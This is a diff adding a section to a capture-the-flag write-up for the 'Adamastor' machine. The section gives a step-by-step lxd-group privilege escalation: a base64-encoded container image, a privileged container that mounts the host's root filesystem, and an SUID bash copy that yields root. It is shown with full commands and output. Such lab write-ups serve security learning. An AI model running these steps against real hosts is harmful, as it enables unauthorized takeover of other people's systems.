@@ -228,7 +228,7 @@ luis@adamastor:~$ cat README_BEFORE_STARTING.TXT
 
 Alright we got a nice `README` but more importantly a binary with the `SUID` bit set! Let's privesc !
 
-### Privilege escalation (Intented way)
+## Privilege escalation (Intented way)
 
 When looking at the binary, we quickly notice that the typical attacks involving files with the SUID bit set like hijacking relative paths won't work for us. 
 We're definitely in front of a reverse engineering challenge, to continue let's copy the file back to our attacker machine:
@@ -1415,5 +1415,264 @@ if __name__ == "__main__":
 ```
 
 The `adamastor` binary deliver us a fully functionnal root shell, we were able to confirm the takeover by executing `id` as root ! We're also able to read files in /root directory, but also to see the small easter egg ! 
+
+## Privilege escalation (A's way, all credit goes to him!)
+
+### Enumerating / Finding the other way around
+
+First step let's get on a temporary, hidden directory to do our work:
+
+```bash
+luis@adamastor:~$ mkdir /tmp/.elm && cd /tmp/.elm && pwd
+/tmp/.elm
+luis@adamastor:/tmp/.elm$
+```
+
+Then let's enumerate either,
+
+manually:
+
+```bash
+luis@adamastor:/tmp/.elm$ id
+uid=1000(luis) gid=1000(luis) groups=1000(luis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
+```
+
+or automatically (`linpeas.sh` should flag in the Basic Information section `lxd` group as `RED/YELLOW: 95% a PE vector`):
+
+```bash
+═══════════════════════════════╣ Basic information ╠═══════════════════════════════
+                               ╚═══════════════════╝
+OS: Linux version 5.15.0-101-generic (buildd@lcy02-amd64-032) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024
+User & Groups: uid=1000(luis) gid=1000(luis) groups=1000(luis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
+Hostname: adamastor
+Writable folder: /dev/shm
+[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
+[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+```
+
+Okay now that we know that `lxd` might be a privesc vector what do we do ? Well we google around of course ! 
+
+We have two good ressources that we will use to privesc through `lxd`:
+
+- https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1
+- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#exploiting-without-internet
+
+### Exploiting `lxd`
+
+First step for us will be to initialize lxd with default options, by hitting enter multiple times. It should technically be the first time being used on the box, allegedly the output should look like this:
+
+```bash
+luis@adamastor:/tmp/.elm$ lxd init
+Would you like to use LXD clustering? (yes/no) [default=no]: 
+Do you want to configure a new storage pool? (yes/no) [default=yes]: 
+Name of the new storage pool [default=default]: 
+Name of the storage backend to use (cephobject, dir, lvm, zfs, btrfs, ceph) [default=zfs]: 
+Create a new ZFS pool? (yes/no) [default=yes]: 
+Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: 
+Size in GiB of the new loop device (1GiB minimum) [default=5GiB]: 
+Would you like to connect to a MAAS server? (yes/no) [default=no]: 
+Would you like to create a new local network bridge? (yes/no) [default=yes]: 
+What should the new bridge be called? [default=lxdbr0]: 
+What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
+What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
+Would you like the LXD server to be available over the network? (yes/no) [default=no]: 
+Would you like stale cached images to be updated automatically? (yes/no) [default=yes]: 
+Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
+```
+
+If you see this line in the output when running `lxd init`:
+
+```bash
+luis@adamastor:/tmp/.elm$ lxd init
+Would you like to use LXD clustering? (yes/no) [default=no]: 
+Do you want to configure a new storage pool? (yes/no) [default=yes]: 
+Name of the new storage pool [default=default]: 
+The requested storage pool "default" already exists. Please choose another name.
+```
+
+That means `lxd` has already been initialized, you can just skip to the next step !
+
+Next step now to make this work, since we don't have network connectivity per say on the machine, we need to use a base64 string that will store our `offline` image (check the first link to learn more about how it was created, basically to quote the author *"The easiest solution to this is to create your own image and upload that via an appropriate technique such as writing a base64 encoded file using echo and then decoding it; and one of the best of these is to use is a busybox template."*). So when applying the technique displayed in the article in the first link, it should look like this:
+
+```bash
+luis@adamastor:/tmp/.elm$ echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > elm.tar.bz2
+luis@adamastor:/tmp/.elm$ ls -latr
+total 856
+-rwxrwxr-x  1 luis luis 860549 Apr  1 19:14 linpeas.sh
+drwxrwxrwt 15 root root   4096 Apr  1 19:39 ..
+-rw-rw-r--  1 luis luis    656 Apr  1 19:43 elm.tar.bz2
+drwxrwxr-x  2 luis luis   4096 Apr  1 19:43 .
+```
+Next for us will be to import the image we just wrote in a file on the target machine like so:
+
+```bash
+luis@adamastor:/tmp/.elm$ lxc image import elm.tar.bz2 --alias elmImage
+Image imported with fingerprint: 8961bb8704bc3fd43269c88f8103cab4fccd55325dd45f98e3ec7c75e501051d
+luis@adamastor:/tmp/.elm$ lxc image list
++----------+--------------+--------+-------------+--------------+-----------+---------+-----------------------------+
+|  ALIAS   | FINGERPRINT  | PUBLIC | DESCRIPTION | ARCHITECTURE |   TYPE    |  SIZE   |         UPLOAD DATE         |
++----------+--------------+--------+-------------+--------------+-----------+---------+-----------------------------+
+| elmImage | 8961bb8704bc | no     |             | x86_64       | CONTAINER | 0.00MiB | Apr 1, 2024 at 7:47pm (UTC) |
++----------+--------------+--------+-------------+--------------+-----------+---------+-----------------------------+
+```
+
+If you got an output like this when executing the command above:
+
+```bash
+luis@adamastor:/tmp/.elm$ lxc image import elm.tar.bz2 --alias elmImage
+Error: Image with same fingerprint already exists
+```
+
+It means the image you tried to import is already there since they found another one with the same signature in the `lxc` environment. What you can do from here is delete the image present on the system by doing `lxc image list` (to find the name of the image to delete), then simply do: `lxc image delete IMAGE_NAME`. Now you should be able to go back to the step above and load your image !
+
+When this is done, we can create a container out of the image like this:
+
+First step will be to initialize our container (`elmContainer`) using the image (`elmImage`) we just created, without forgetting to set the `security.privileged` flag to `true`!:
+
+```bash
+luis@adamastor:/tmp/.elm$ lxc init elmImage elmContainer -c security.privileged=true
+Creating elmContainer
+luis@adamastor:/tmp/.elm$ lxc list
++--------------+---------+------+------+-----------+-----------+
+|     NAME     |  STATE  | IPV4 | IPV6 |   TYPE    | SNAPSHOTS |
++--------------+---------+------+------+-----------+-----------+
+| elmContainer | STOPPED |      |      | CONTAINER | 0         |
++--------------+---------+------+------+-----------+-----------+
+```
+
+Next we will configure our container to connect our disk (`host-root` is just the handle name we use, basically allowing us to take everything from the path `/` and everything under on the actual target machine) to a folder in our container called `r` (don't change the name of the path from `r` to anything else, the image we used to build this container will only accept this name, if you do change the path name, the container won't start later!):
+
+```bash
+luis@adamastor:/tmp/.elm$ lxc config device add elmContainer host-root disk source=/ path=r recursive=true
+Device host-root added to elmContainer
+```
+
+Now that this is done, we can start `elmContainer` like so:
+
+```bash
+luis@adamastor:/tmp/.elm$ lxc start elmContainer 
+luis@adamastor:/tmp/.elm$ lxc list
++--------------+---------+------+-----------------------------------------------+-----------+-----------+
+|     NAME     |  STATE  | IPV4 |                     IPV6                      |   TYPE    | SNAPSHOTS |
++--------------+---------+------+-----------------------------------------------+-----------+-----------+
+| elmContainer | RUNNING |      | fd42:27f1:4317:fcfb:216:3eff:fee4:bb2e (eth0) | CONTAINER | 0         |
++--------------+---------+------+-----------------------------------------------+-----------+-----------+
+```
+
+Now that the container is running, our final step will be to execute a shell like this:
+
+```bash
+luis@adamastor:/tmp/.elm$ lxc exec elmContainer /bin/bash
+bash-5.1# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Bingo we're almost done, the final step to gain full control of `Adamastor` will be to do something like this:
+
+(multiple ways to do this, you choose, you could put your `ssh` public key in the `authorized_keys` file of `root` or also create a bash `SUID` binary in your `/tmp` folder, your call, there's a ton of ways to gain full control, for this exemple we will go the bash `SUID` binary route !)
+
+
+```bash
+bash-5.1# ls -latr /
+total 13
+drwxr-xr-x   3 root root    3 Oct 16  2018 var
+drwxr-xr-x   2 root root    2 Oct 16  2018 tmp
+drwxr-xr-x   3 root root    8 Oct 16  2018 etc
+drwxr-xr-x   2 root root    3 Oct 16  2018 sbin
+lrwxrwxrwx   1 root root    7 Oct 16  2018 usr -> ./r/usr
+lrwxrwxrwx   1 root root    9 Oct 16  2018 lib64 -> ./r/lib64
+lrwxrwxrwx   1 root root    7 Oct 16  2018 lib -> ./r/lib
+lrwxrwxrwx   1 root root    7 Oct 16  2018 bin -> ./r/bin
+drwxr-xr-x  20 root root 4096 Mar 19 19:16 r
+dr-xr-xr-x  13 root root    0 Apr  1 21:03 sys
+dr-xr-xr-x 260 root root    0 Apr  1 21:03 proc
+drwxr-xr-x  11 root root   15 Apr  1 21:03 ..
+drwxr-xr-x  11 root root   15 Apr  1 21:03 .
+drwxr-xr-x   7 root root  420 Apr  1 21:03 dev
+drwxr-xr-x   2 root root    3 Apr  1 21:06 root
+bash-5.1# cd /r && ls -latr
+total 78
+lrwxrwxrwx   1 root root     8 Feb 16 18:37 sbin -> usr/sbin
+lrwxrwxrwx   1 root root    10 Feb 16 18:37 libx32 -> usr/libx32
+lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root     9 Feb 16 18:37 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root     7 Feb 16 18:37 lib -> usr/lib
+lrwxrwxrwx   1 root root     7 Feb 16 18:37 bin -> usr/bin
+drwxr-xr-x  14 root root  4096 Feb 16 18:37 usr
+drwxr-xr-x   2 root root  4096 Feb 16 18:37 srv
+drwxr-xr-x   2 root root  4096 Feb 16 18:37 opt
+drwxr-xr-x   2 root root  4096 Feb 16 18:37 mnt
+drwxr-xr-x   6 root root  4096 Feb 16 18:52 snap
+dr-xr-xr-x   2 root root  4096 Feb 16 23:52 cdrom
+drwx------   2 root root 16384 Mar 19 18:49 lost+found
+drwxr-xr-x   4 root root  4096 Mar 19 18:50 boot
+drwxr-xr-x   3 root root  4096 Mar 19 18:52 home
+drwxr-xr-x  14 root root  4096 Mar 19 19:12 var
+-rw-r--r--   1 root root    50 Mar 19 19:16 t4k3_th1s_p4ssw0rd_l4st_34sy_th1ng_y0ull_s33_before_g01ng_NUTS.txt
+drwxr-xr-x  20 root root  4096 Mar 19 19:16 .
+drwx------   5 root root  4096 Mar 19 19:18 root
+drwxr-xr-x  99 root root  4096 Mar 19 19:39 etc
+dr-xr-xr-x  13 root root     0 Apr  1 20:40 sys
+dr-xr-xr-x 260 root root     0 Apr  1 20:40 proc
+drwxr-xr-x  30 root root   860 Apr  1 20:41 run
+drwxr-xr-x   2 root root  4096 Apr  1 20:47 media
+drwxr-xr-x  20 root root  4080 Apr  1 20:47 dev
+drwxr-xr-x  11 root root    15 Apr  1 21:03 ..
+drwxrwxrwt  14 root root  4096 Apr  1 21:09 tmp
+bash-5.1# cp ./bin/bash ./tmp/.elm/bash && chmod +s ./tmp/.elm/bash
+bash-5.1# ls -latr ./tmp/.elm/
+total 1376
+-rw-rw-r--  1 1000 1000     656 Apr  1 20:46 elm.tar.bz2
+drwxrwxrwt 14 root root    4096 Apr  1 21:09 ..
+drwxrwxr-x  2 1000 1000    4096 Apr  1 21:14 .
+-rwsr-sr-x  1 root root 1396520 Apr  1 21:14 bash
+```
+
+Okay now that we got our `SUID` bash program in our folder, let's get out of the container and execute this binary !!!
+
+```bash
+bash-5.1# exit
+exit
+luis@adamastor:/tmp/.elm$ ./bash -p
+bash-5.1# id
+uid=1000(luis) gid=1000(luis) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),1000(luis)
+```
+
+Bingo ! Congratz, we've rooted the machine with A's way ! :)
+
+One last nice step you can take is actually cleaning up the `lxc` environment to remove your image / container just in case someone play after you, you can do so like this:
+
+```bash
+luis@adamastor:/tmp/.elm$ lxc list
++--------------+---------+------+-----------------------------------------------+-----------+-----------+
+|     NAME     |  STATE  | IPV4 |                     IPV6                      |   TYPE    | SNAPSHOTS |
++--------------+---------+------+-----------------------------------------------+-----------+-----------+
+| elmContainer | RUNNING |      | fd42:27f1:4317:fcfb:216:3eff:feb3:2e40 (eth0) | CONTAINER | 0         |
++--------------+---------+------+-----------------------------------------------+-----------+-----------+
+luis@adamastor:/tmp/.elm$ lxc stop elmContainer 
+luis@adamastor:/tmp/.elm$ lxc list
++--------------+---------+------+------+-----------+-----------+
+|     NAME     |  STATE  | IPV4 | IPV6 |   TYPE    | SNAPSHOTS |
++--------------+---------+------+------+-----------+-----------+
+| elmContainer | STOPPED |      |      | CONTAINER | 0         |
++--------------+---------+------+------+-----------+-----------+
+luis@adamastor:/tmp/.elm$ lxc delete elmContainer 
+luis@adamastor:/tmp/.elm$ lxc image list
++----------+--------------+--------+-------------+--------------+-----------+---------+-----------------------------+
+|  ALIAS   | FINGERPRINT  | PUBLIC | DESCRIPTION | ARCHITECTURE |   TYPE    |  SIZE   |         UPLOAD DATE         |
++----------+--------------+--------+-------------+--------------+-----------+---------+-----------------------------+
+| elmImage | 8961bb8704bc | no     |             | x86_64       | CONTAINER | 0.00MiB | Apr 1, 2024 at 8:47pm (UTC) |
++----------+--------------+--------+-------------+--------------+-----------+---------+-----------------------------+
+luis@adamastor:/tmp/.elm$ lxc image delete elmImage
+luis@adamastor:/tmp/.elm$ lxc image list
++-------+-------------+--------+-------------+--------------+------+------+-------------+
+| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCHITECTURE | TYPE | SIZE | UPLOAD DATE |
++-------+-------------+--------+-------------+--------------+------+------+-------------+
+```
+
+Now we're really finished !!
+
+Alright, thanks to A again for this other way around, at least we will have two pathways we can take during our privilege escalation process to complete the machine!
 
 That was quite a fun box to create / do, hope you enjoyed it, we've reached the End Game !!
